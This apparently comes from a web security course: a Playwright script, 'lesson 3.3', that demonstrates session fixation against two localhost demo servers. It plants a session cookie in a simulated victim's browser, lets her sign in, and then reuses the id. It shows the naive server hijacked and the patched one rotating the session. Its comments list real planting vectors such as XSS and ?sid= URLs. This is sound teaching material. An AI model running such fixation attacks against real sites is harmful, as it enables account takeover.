// demo3/fixation.mjs — lesson 3.3: the attacker plants a session id in An's browser, waits for her to sign in, then uses it.
// Planting = context.addCookies (in real life: a sibling subdomain, an XSS on another app of the site, a URL that accepts ?sid=).
import { chromium } from 'playwright';
const json = async (r) => `${r.status} ${await r.text()}`;
const signInInPage = (page, base) => page.evaluate((b) => fetch(b + '/sign-in', { method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ email: 'an@student.labflow.example', password: 'an-lab-2026' }) }).then((r) => r.status), base);
const browser = await chromium.launch();

// 1. the naive server (:4802) — the attacker visits first and keeps the anonymous sid
let r = await fetch('http://localhost:4802/');
const sid = r.headers.get('set-cookie').split(';')[0].slice(4);
console.log(`naive :4802  attacker got anonymous sid ${sid.slice(0, 8)}…`);
let ctx = await browser.newContext();
await ctx.addCookies([{ name: 'sid', value: sid, domain: 'localhost', path: '/' }]);
let page = await ctx.newPage();
await page.goto('http://localhost:4802/');
console.log(`naive :4802  An signs in in her browser → ${await signInInPage(page, 'http://localhost:4802')}; her sid is still ${(await ctx.cookies())[0].value.slice(0, 8)}…`);
console.log(`naive :4802  attacker GET /me with his sid → ${await json(await fetch('http://localhost:4802/me', { headers: { cookie: 'sid=' + sid } }))}`);

// 2. LabFlow ID v0.3 (:4800) — the attacker signs in as Binh and plants HIS valid session in An's browser
r = await fetch('http://localhost:4800/sign-in', { method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ email: 'binh@student.labflow.example', password: '123456' }) });
const planted = r.headers.get('set-cookie').split(';')[0].split('=')[1];
ctx = await browser.newContext();
await ctx.addCookies([{ name: '__Host-lfid_ses', value: planted, domain: 'localhost', path: '/', secure: true, httpOnly: true }]);
page = await ctx.newPage();
await page.goto('http://localhost:4800/me');
console.log(`v0.3  :4800  planted ${planted.slice(0, 17)}…; An's tab before signing in: ${await page.textContent('body')}`);
console.log(`v0.3  :4800  An signs in → ${await signInInPage(page, 'http://localhost:4800')}; her cookie is now ${(await ctx.cookies())[0].value.slice(0, 17)}…`);
console.log(`v0.3  :4800  attacker GET /me with the planted id → ${await json(await fetch('http://localhost:4800/me', { headers: { cookie: '__Host-lfid_ses=' + planted } }))}`);
await page.goto('http://localhost:4800/me');
console.log(`v0.3  :4800  An's tab → ${await page.textContent('body')}`);
await browser.close();
